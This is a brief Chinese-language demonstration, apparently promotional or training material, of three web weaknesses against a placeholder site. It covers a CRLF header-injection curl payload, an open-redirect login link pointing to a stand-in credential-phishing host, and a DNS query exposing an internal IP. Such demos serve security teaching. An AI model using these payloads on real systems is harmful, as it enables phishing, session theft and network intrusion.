實戰演示

演示 1: CRLF 注入攻擊

攻擊者在 URL 中注入 CRLF 字元，成功在 HTTP 回應中植入惡意標頭：

攻擊指令：
curl -skI 'https://target.com/%0d%0aX-Injected:malicious'
伺服器回應（成功注入）：
HTTP/1.1 200 OK
X-Injected: malicious
Content-Type: text/html

影響：攻擊者可竊取使用者 Session、進行釣魚攻擊、繞過安全控管。

演示 2: Open Redirect 攻擊

利用登入頁面的 redirect 參數，將使用者導向惡意網站：

惡意連結：
https://target.com/login?redirect=https://steal-password.com
結果：
使用者看到正常的登入頁面，但帳號密碼已送出到攻擊者伺服器

影響：釣魚攻擊成功率大幅提升，使用者難以察覺。

演示 3: 內網 IP 洩漏

透過公開 DNS 查詢，直接取得內網基礎架構資訊：

DNS 查詢：
dig dev.target.com A +short
10.1.0.202 ← 內網 IP 直接暴露
攻擊者可以：
1. 定位開發/測試環境
2. 嘗試直接連接內網服務
3. 繞過防火牆進行內網滲透
